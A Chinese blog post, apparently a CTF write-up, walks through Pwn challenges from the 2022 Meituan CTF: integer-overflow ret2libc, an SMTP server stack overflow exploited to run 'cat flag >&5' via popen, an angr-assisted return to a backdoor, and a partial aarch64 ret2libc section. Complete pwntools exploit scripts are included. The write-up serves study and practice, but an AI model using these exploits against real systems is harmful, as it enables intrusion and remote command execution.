<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2022年 第五届美团CTF Pwn题复现 | tolele的自由小屋</title><meta name="author" content="tolele,1623093551@qq.com"><meta name="copyright" content="tolele"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x00：note分析程序是一个菜单选择，其中Edit函数里面存在整数溢出：  但number为负数时，会对数组反方向的数据进行操作。 同时，checksec发现PIE和canary保护机制没有开启： tolele@tolele-ubuntu22:~&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn $ checksec note [*] &#39;&#x2F;home&#x2F;tolele&#x2F;CTFgame&#x2F;2022MT">
<meta property="og:type" content="article">
<meta property="og:title" content="2022年 第五届美团CTF Pwn题复现">
<meta property="og:url" content="http://example.com/2022/10/08/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="tolele的自由小屋">
<meta property="og:description" content="0x00：note分析程序是一个菜单选择，其中Edit函数里面存在整数溢出：  但number为负数时，会对数组反方向的数据进行操作。 同时，checksec发现PIE和canary保护机制没有开启： tolele@tolele-ubuntu22:~&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn $ checksec note [*] &#39;&#x2F;home&#x2F;tolele&#x2F;CTFgame&#x2F;2022MT">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/fen/wen02.jpg">
<meta property="article:published_time" content="2022-10-08T07:30:30.000Z">
<meta property="article:modified_time" content="2022-12-01T10:14:28.728Z">
<meta property="article:author" content="tolele">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/fen/wen02.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/10/08/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2022年 第五届美团CTF Pwn题复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-12-01 18:14:28'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cropPhoto.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/top/wen02.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">tolele的自由小屋</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022年 第五届美团CTF Pwn题复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-08T07:30:30.000Z" title="发表于 2022-10-08 15:30:30">2022-10-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-01T10:14:28.728Z" title="更新于 2022-12-01 18:14:28">2022-12-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022年 第五届美团CTF Pwn题复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="0x00：note"><a href="#0x00：note" class="headerlink" title="0x00：note"></a>0x00：note</h2><p>分析程序是一个菜单选择，其中Edit函数里面存在整数溢出：</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic01.png" alt="pic01"></p>
<p>但number为负数时，会对数组反方向的数据进行操作。</p>
<p>同时，checksec发现PIE和canary保护机制没有开启：</p>
<pre><code>tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn $ checksec note
[*] &#39;/home/tolele/CTFgame/2022MTCTF/pwn/note&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
</code></pre>
<p>那么，可以先试着对堆数组的下边（反方向）查看，看看有没有可利用的东西。</p>
<p>从IDA可得知：<code>.text:0000000000401714                 call    Edit</code></p>
<p>我们可以在0x401714处断下，然后用si步入Edit函数，在继续si直到rsp/rbp布置好后，查看栈上的内容：</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic02.png" alt="pic02"></p>
<p>第一次先泄露出libc基址，第二次再进行getshell。</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

io = process(&quot;./note&quot;)
elf = ELF(&quot;./note&quot;)
libc = ELF(&quot;./libc-2.31.so&quot;)

puts_plt = elf.plt[&#39;puts&#39;]
puts_got = elf.got[&#39;puts&#39;]
pop_rdi_ret = 0x4017b3
main = 0x401679

def add(size, content):
    io.sendlineafter(&quot;5. leave&quot;, &quot;1&quot;)
    io.sendlineafter(&quot;Size:&quot;, str(size))
    io.sendlineafter(&quot;Content:&quot;, content)

def edit(idx, content):
    io.sendlineafter(&quot;5. leave&quot;, &quot;3&quot;)
    io.sendlineafter(&quot;Index: &quot;, str(idx))
    io.sendlineafter(&quot;Content: &quot;, content)
def debug():
    gdb.attach(io)
    pause()

payload = b&#39;A&#39;*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
edit(-6, payload)
libc_base = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - libc.sym[&#39;puts&#39;]
print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))

system = libc_base + libc.sym[&#39;system&#39;]
binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
ret = 0x40101a
payload = b&#39;A&#39;*8 + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system)
edit(-6, payload)
io.interactive()
</code></pre>
<br>

<h2 id="0x01：SMTP"><a href="#0x01：SMTP" class="headerlink" title="0x01：SMTP"></a>0x01：SMTP</h2><p>一道stmp的协议逆向题，程序比较大，先执行程序根据信息再进行分析。</p>
<pre><code>// 执行程序充当服务端
tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ ./pwn
listener: waiting for connections...     //连接前就输出的信息
listener: got connection from 127.0.0.1  //以下为连接后输出的信息
listener: initiated a new session worker
session 5: starting work, state 0
|                          //等待客户端的请求...

// 连接,充当客户端
tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ nc 127.0.0.1 9999
220 SMTP tsmtp
|                          //等待输入请求...
</code></pre>
<p>有了这些信息后，接着静态分析程序：</p>
<pre><code class="c">// main函数
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
&#123;
  if ( argc == 2 )
    listener((char *)argv[1]);
  listener(&quot;9999&quot;);           //不特定监听端口则默认9999
&#125;

//listener函数
void __cdecl __noreturn listener(char *service)
&#123;
  // ...略...
  puts(&quot;listener: waiting for connections...&quot;);  //等待连接（对应已获取的信息）
  epfd = epoll_create(16);
  event.data.fd = fd;
  event.events = 1;
  epoll_ctl(epfd, 1, fd, &amp;event);
  events = (struct epoll_event *)calloc(0x10u, 0xCu);
  while ( 1 )
  &#123;
    v12 = epoll_wait(epfd, events, 1, -1);
    for ( i = 0; i &lt; v12; ++i )
    &#123;
      if ( fd == events[i].data.fd )
      &#123;
        addr_len = 128;
        v11 = accept(fd, &amp;addr, &amp;addr_len);
        v1 = (const void *)get_in_addr(&amp;addr);
        inet_ntop(addr.sa_family, v1, buf, 0x2Eu);
        printf(&quot;listener: got connection from %s\n&quot;, buf); //连接
        arg = malloc(0x14u);
        *(_DWORD *)arg = v11;
        *((_DWORD *)arg + 1) = 0;
        pthread_create(&amp;newthread, 0, (void *(*)(void *))session_worker, arg); //创建线程,去执行session_work函数
        puts(&quot;listener: initiated a new session worker&quot;);
      &#125;
    &#125;
  &#125;
&#125;

// session_worker函数
void *__cdecl session_worker(int *a1)
&#123;
  // ...略...
  v35 = a1;
  fd = *a1;
  session_reset(a1);
  printf(&quot;session %d: starting work, state %d\n&quot;, fd, a1[1]);
  v1 = strlen(off_804D0A0[0]);
  send(fd, off_804D0A0[0], v1, 0);
  // ...略...
  while ( v35[1] != 5 )
  &#123;
    v29 = epoll_wait(epfd, events, 1, timeout);
    if ( !v29 )
    &#123;
      close(fd);
      printf(&quot;session %d: timeout, work is over\n&quot;, fd);
      break;
    &#125;
    if ( v29 == 1 )
    &#123;
      memset(s, 0, 0x400u);
      v28 = recv(fd, s, nmemb - 1, 0);   //接收到请求，赋给s
      if ( !v28 )
      &#123;
        printf(&quot;session %d: client closed connection\n&quot;, fd);
        break;
      &#125;
      if ( v28 &lt; 0 )
      &#123;
        printf(&quot;session %d: recv error\n&quot;, fd);
        break;
      &#125;
      ptr = (void *)parse_request((char *)s);  //解析请求
      if ( v35[1] != 4 || *(_DWORD *)ptr == 4 )
      &#123;
        if ( v35[1] == 4 &amp;&amp; *(_DWORD *)ptr == 4 &amp;&amp; strlen((const char *)s) &gt; 3 )
        &#123;
          if ( *(_DWORD *)(v35[4] + 8) )
          &#123;
            v7 = strlen((const char *)s);
            v24 = v7 + strlen(*(const char **)(v35[4] + 8)) + 1;
            v23 = (char *)malloc(v24);
            v8 = strlen(*(const char **)(v35[4] + 8));
            strncpy(v23, *(const char **)(v35[4] + 8), v8 + 1);
            v9 = strlen((const char *)s);
            strncat(v23, (const char *)s, v9 - 5);
            v23[v24] = 0;
            free(*(void **)(v35[4] + 8));
            *(_DWORD *)(v35[4] + 8) = v23;
          &#125;
          else
          &#123;
            v6 = v35[4];
            *(_DWORD *)(v6 + 8) = strdup((const char *)s);
          &#125;
          if ( *((_DWORD *)ptr + 1) )
            free(*((void **)ptr + 1));
        &#125;
        switch ( *(_DWORD *)ptr )
        &#123;
          case 0:       // HELO
            session_reset(v35);
            if ( !v35[1] )
            &#123;
              v10 = strlen(server_replies[0]);
              send(fd, server_replies[0], v10, 0);
            &#125;
            v35[1] = 1;
            v11 = strdup(*((const char **)ptr + 1));
            v35[3] = (int)v11;
            printf(&quot;session %d: state changed to greeted\n&quot;, fd);
            break;
          case 1:       // MAIL FROM:
            if ( v35[1] != 1 )
              goto LABEL_41;
            v35[1] = 2;
            v12 = (char **)v35[4];
            *v12 = strdup(*((const char **)ptr + 1));
            v13 = strlen(server_replies[0]);
            send(fd, server_replies[0], v13, 0);
            printf(&quot;session %d: got mail from\n&quot;, fd);
            break;
          case 2:       // RCPT TO:
            if ( v35[1] != 2 &amp;&amp; v35[1] != 3 )
              goto LABEL_41;
            v35[1] = 3;
            v14 = v35[4];
            *(_DWORD *)(v14 + 4) = strdup(*((const char **)ptr + 1));// 重点
            v15 = strlen(server_replies[0]);
            send(fd, server_replies[0], v15, 0);
            printf(&quot;session %d: state changed to got receipients\n&quot;, fd);
            break;
          case 3:       // DATA
            if ( v35[1] != 3 )
              goto LABEL_41;
            v35[1] = 4;
            v16 = strlen(off_804D0A8[0]);
            send(fd, off_804D0A8[0], v16, 0);
            printf(&quot;session %d: state changed to data receival\n&quot;, fd);
            break;
          case 4:       // .\r\n
            if ( v35[1] == 4 )
            &#123;
              session_submit(v35);
              session_reset(v35);
              v35[1] = 1;
              v17 = strlen(server_replies[0]);
              send(fd, server_replies[0], v17, 0);
              printf(&quot;session %d: data transaction over, state changed to greeted\n&quot;, fd);
            &#125;
            else
            &#123;
LABEL_41:
              v18 = strlen(off_804D0B0);
              send(fd, off_804D0B0, v18, 0);
            &#125;
            break;
          case 5:
            v35[1] = 5;
            v19 = strlen(off_804D0AC[0]);
            send(fd, off_804D0AC[0], v19, 0);
            printf(&quot;session %d: state changed to quit\n&quot;, fd);
            break;
          default:
            v20 = strlen(off_804D0A4[0]);
            send(fd, off_804D0A4[0], v20, 0);
            printf(&quot;session %d: syntax error\n&quot;, fd);
            break;
        &#125;
      &#125;
      else
      &#123;
       //...略...
      &#125;
      free(ptr);
    &#125;
  &#125;
  free(s);
  free(a1);
  printf(&quot;session %d: finished\n&quot;, fd);
  close(fd);
  return 0;
&#125;
</code></pre>
<pre><code class="c">// 请求解析函数,parse_request
_DWORD *__cdecl parse_request(char *s)
&#123;
  char *argument_string_start; // [esp+4h] [ebp-14h]
  char *ptr; // [esp+8h] [ebp-10h]
  _DWORD *v4; // [esp+Ch] [ebp-Ch]

  v4 = malloc(8u);
  *v4 = get_session_command(s);
  if ( *v4 == -1 )
  &#123;
    v4[1] = 0;
    return v4;
  &#125;
  else
  &#123;
    v4[1] = 0;
    ptr = strdup(s);
    argument_string_start = (char *)get_argument_string_start(ptr, *v4);
    if ( *argument_string_start )
      v4[1] = strdup(argument_string_start);
    free(ptr);
    return v4;
  &#125;
&#125;

// 对应的请求命令
int __cdecl get_session_command(char *s1)
&#123;
  size_t v2; // eax

  if ( !strncmp(s1, &quot;HELO&quot;, 4u) )
    return 0;
  if ( !strncmp(s1, &quot;MAIL FROM:&quot;, 0xAu) )
    return 1;
  if ( !strncmp(s1, &quot;RCPT TO:&quot;, 8u) )
    return 2;
  if ( !strncmp(s1, &quot;DATA&quot;, 4u) )
    return 3;
  if ( !strncmp(s1, &quot;.\r\n&quot;, 3u) )
    return 4;
  v2 = strlen(s1);
  if ( !strncmp(&amp;s1[v2 - 5], &quot;\r\n.\r\n&quot;, 5u) )
    return 4;
  if ( !strncmp(s1, &quot;QUIT&quot;, 4u) )
    return 5;
  return -1;
&#125;
</code></pre>
<p>通过对这几个case代码审计，发现漏洞存在case 4的session_submit函数中的sender_worker中。</p>
<pre><code class="c">// session_submit函数
int __cdecl session_submit(_DWORD *a1)
&#123;
  pthread_t newthread[2]; // [esp+Ch] [ebp-Ch] BYREF

  printf(&quot;session %d: received message &#39;%s&#39;\n&quot;, *a1, *(const char **)(a1[4] + 8));
  printf(&quot;session %d: handing off message to sender\n&quot;, *a1);
  return pthread_create(newthread, 0, sender_worker, (void *)a1[4]);
&#125;

// sender_worker函数
void *__cdecl sender_worker(const char **a1)
&#123;
  char s[256]; // [esp+Ch] [ebp-10Ch] BYREF
  const char **v3; // [esp+10Ch] [ebp-Ch]

  puts(&quot;sender: starting work&quot;);
  v3 = a1;
  len = strlen(a1[1]);
  puts(&quot;sender: sending message....&quot;);
  printf(&quot;sender: FROM: %s\n&quot;, *a1);
  if ( strlen(*a1) &lt;= 79 )
    strcpy(from, *v3);     //from:0x0804d140
  if ( len &lt;= 0xFFu )   
  &#123;
    printf(&quot;sender: TO: %s\n&quot;, v3[1]);
  &#125;
  else
  &#123;
    memset(s, 0, sizeof(s));
    strcpy(s, v3[1]);      //直接拷贝,存在溢出
    printf(&quot;sender: TO: %s\n&quot;, s);
  &#125;
  puts(&quot;sender: BODY:&quot;);
  if ( v3[2] )
    printf(&quot;%s&quot;, v3[2]);
  else
    puts(&quot;No body.&quot;);
  putchar(10);
  puts(&quot;sender: finished&quot;);
  return 0;
&#125;
</code></pre>
<p>现在知道了在sender_worker中，v3[1]会导致栈溢出。我们还需要知道v3[1]对应的是哪个命令的数据，我们可以逐函数反推。反推可得v3[1]是”RCPT TO:”后面接着的数据，但其需要最后处理.\r\n时才能触发。</p>
<p>popen函数可以执行任意可执行命令，我们可以在MAIL FROM:后添加数据，向bss段写入”cat flag &gt;&amp;5”，然后使用popen(“cat flag &gt;&amp;5”, “r”)读取flag。&gt;&amp;5是需要重定向，具体的值需要一个个试。</p>
<p>理论上：payload = b’a’ * 0x110 + p32(elf.plt[‘popen’]) + p32(0xdeadbeef) + p32(bss) + p32(read)</p>
<p>但执行过程发现crash了，调试发现，程序断在了这里：</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic03.png" alt="pic03"></p>
<p>原因是上一步把’aaaa’传给了eax，导致下个指令对一个无效地址进行访问，导致了SIGSEGV。所以我们需要在[ebp - 0xc]处给个有效地址。</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)

io = remote(&quot;127.0.0.1&quot;, 9999)
elf = ELF(&quot;./pwn&quot;)

io.sendlineafter(b&#39;220 SMTP tsmtp&#39;, b&#39;HELO&#39;)
io.sendlineafter(b&#39;250 Ok&#39;, b&#39;MAIL FROM:&#39; + b&#39;cat flag &gt;&amp;5&#39;)   # shellcode
read = elf.search(b&#39;r\x00&#39;).__next__()
bss = 0x0804D140
payload = b&#39;a&#39; * 0x100 + p32(0x08049024) + b&#39;a&#39; * 0xc + p32(elf.plt[&#39;popen&#39;]) + p32(0xdeadbeef) + p32(bss) + p32(read)
io.sendlineafter(b&#39;250 Ok&#39;, b&#39;RCPT TO:&#39; + payload)
io.sendlineafter(b&#39;250 Ok&#39;, b&#39;DATA&#39; + b&#39;bbbb&#39;)
io.sendline(b&#39;.\r\n&#39;)
io.interactive()
</code></pre>
<br>

<h2 id="0x02：捉迷藏"><a href="#0x02：捉迷藏" class="headerlink" title="0x02：捉迷藏"></a>0x02：捉迷藏</h2><p>下面是程序的函数调用关系图，这样一看，倒不算是太复杂。但点进main函数一看，💩💩💩。</p>
<img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic04.png" alt="pic04" style="zoom:80%;" />

<br>

<p>事后诸葛亮一波：</p>
<p>程序中给出了backdoor函数可以直接getshell，由于函数里面大量出现了input_val和input_line的输入函数，所以可以优先考虑简单的栈溢出。input_line函数会对局部变量进行输入，这么多变量，我们可以从靠近rbp一端的变量开始按顺序寻找，查看函数中哪里引用了变量。对着变量右键，<code>Jump to xref</code>，就可以查看哪里引用了该变量。</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic06.png" alt="pic06"></p>
<p>通过查找，发现了变量v341存在栈溢出：</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic07.png" alt="pic07"></p>
<p>我们首先通过angr找到能执行到该路径的符号变量，然后添加能执行getshell的约束，当符号变量满足时，发送数据去getshell（噢~这糟糕的表达🤧）。因为程序执行过程中<code>fksth</code>、<code>input_line</code>和<code>input_val</code>函数会大量执行，且其内部含有循环，为了防止探索过程中路径爆炸，需要编写相应的hook函数对其替代。具体的hook函数见exp中的<code>ReplacementCheckEquals</code>、<code>ReplacementInputVal</code>和<code>ReplacementCheckInput</code>函数。至于文中state的<code>unconstrained</code>，个人理解是保存需要用户输入的路径。</p>
<p>本题的一个疑惑点是add_constraints函数具体做了什么？d = simgr.explore()之后，d.unconstrained是固定的了，那每个路径约束的符号变量会不会是多个呢？如果是单个的话，显然后面的添加的约束就没有意义了。还有就是添加的约束是要求对地址绝对的符合，如果符号变量的随机模拟的，岂不是相当于爆破？不过，执行exp很快就有结果了，个人猜测：某次检查符号变量不满足那两个约束后，下一次生成符号变量时，angr会不会有什么机制根据上一次的受阻约束来进行调整，从而生成满足这两个约束的符号变量。</p>
<p>看来还得深入了解~</p>
<pre><code class="python"># 来自toka师傅的exp
# ipython3 exp.py
from pwn import *
import angr
import claripy
import base64
ret_rop = 0x4013C8
 
r=process(&quot;./pwn&quot;)
 
p = angr.Project(&quot;./pwn&quot;)
 
def getBVV(state, sizeInBytes, type = &#39;str&#39;):
    global pathConditions
    name = &#39;s_&#39; + str(state.globals[&#39;symbols_count&#39;])
    bvs = claripy.BVS(name, sizeInBytes * 8)
    state.globals[&#39;symbols_count&#39;] += 1
    state.globals[name] = (bvs, type)
    return bvs
 
def angr_load_str(state, addr):
    s, i = &#39;&#39;, 0
    while True:
        ch = state.solver.eval(state.memory.load(addr + i, 1))
        if ch == 0: break
        s += chr(ch)
        i += 1
    return s
 
class ReplacementCheckEquals(angr.SimProcedure):
    def run(self, str1, str2):
        cmp1 = angr_load_str(self.state, str2).encode(&quot;ascii&quot;)
        cmp0 = self.state.memory.load(str1, len(cmp1))
        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(0, 32), claripy.BVV(1, 32))
 
class ReplacementCheckInput(angr.SimProcedure):
    def run(self, buf, len):
        len = self.state.solver.eval(len)
        self.state.memory.store(buf, getBVV(self.state, len))
 
class ReplacementInputVal(angr.SimProcedure):
    def run(self):
        self.state.regs.rax = getBVV(self.state, 4, &#39;int&#39;) 
 
 
p.hook_symbol(&quot;fksth&quot;, ReplacementCheckEquals())
p.hook_symbol(&quot;input_line&quot;, ReplacementCheckInput())
p.hook_symbol(&quot;input_val&quot;, ReplacementInputVal())
 
enter = p.factory.entry_state()
enter.globals[&#39;symbols_count&#39;] = 0
simgr = p.factory.simgr(enter, save_unconstrained=True)
d = simgr.explore()
backdoor = p.loader.find_symbol(&#39;backdoor&#39;).rebased_addr
for state in d.unconstrained:
    bindata = b&#39;&#39;
    rsp = state.regs.rsp
    next_stack = state.memory.load(rsp, 8, endness=p.arch.memory_endness)
    state.add_constraints(state.regs.rip == ret_rop)
    state.add_constraints(next_stack == backdoor)
    for i in range(state.globals[&#39;symbols_count&#39;]):
        s, s_type = state.globals[&#39;s_&#39; + str(i)]
        if s_type == &#39;str&#39;:
            bb = state.solver.eval(s, cast_to=bytes)
            if bb.count(b&#39;\x00&#39;) == len(bb):
                bb = b&#39;A&#39; * bb.count(b&#39;\x00&#39;)
            bindata += bb
            print(bb)
        elif s_type == &#39;int&#39;:
            bindata += str(state.solver.eval(s, cast_to=int)).encode(&#39;ASCII&#39;) + b&#39; &#39;
            print(str(state.solver.eval(s, cast_to=int)).encode(&#39;ASCII&#39;) + b&#39; &#39;)
    print(bindata)
    r.send(bindata)
    r.interactive()
    break
</code></pre>
<br>

<h2 id="0x03：ret2libc-aarch64"><a href="#0x03：ret2libc-aarch64" class="headerlink" title="0x03：ret2libc_aarch64"></a>0x03：ret2libc_aarch64</h2><pre><code>tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/aarch $ checksec pwn
[*] &#39;/home/tolele/CTFgame/2022MTCTF/pwn/aarch/pwn&#39;
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3f0000)
</code></pre>
<p>一道aarch64指令架构的题，具体的指令可以自行上网搜索。</p>
<p>用IDA进行静态分析：</p>
<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  int v4; // [xsp+1Ch] [xbp+1Ch]

  init(argc, argv, envp);
  do
  &#123;
    while ( 1 )
    &#123;
      menu();
      v4 = get_int();
      if ( v4 == 3 )
        exit(0);
      if ( v4 != 1 )
        break;
      puts(&quot;sensible&gt;&gt;&quot;);
      leak();                                   // 泄露libc基址
    &#125;
  &#125;
  while ( v4 != 2 );
  puts(&quot;sensible&gt;&gt;&quot;);
  overflow();                                   // 栈溢出
  return 0;
&#125;
</code></pre>
<pre><code class="C">// leak函数
__int64 leak()
&#123;
  const char *buf; // [xsp+18h] [xbp+18h] BYREF

  buf = 0LL;
  read(0, &amp;buf, 8uLL);
  return puts(buf);
&#125;
</code></pre>
<p>leak函数只要输入puts_got，就可以直接泄露libc基址。不过要注意因为该架构下libc地址中有\x00字节产生截断，所以需要加上0x4000000000。</p>
<br>

<pre><code>// overflow函数
__int64 overflow()
&#123;
  char s[128]; // [xsp+10h] [xbp+10h] BYREF

  printf(&quot;&gt; &quot;);
  gets(s);
  puts(&quot;Your Input: \n&quot;);
  puts(s);
  return 0LL;
&#125;
</code></pre>
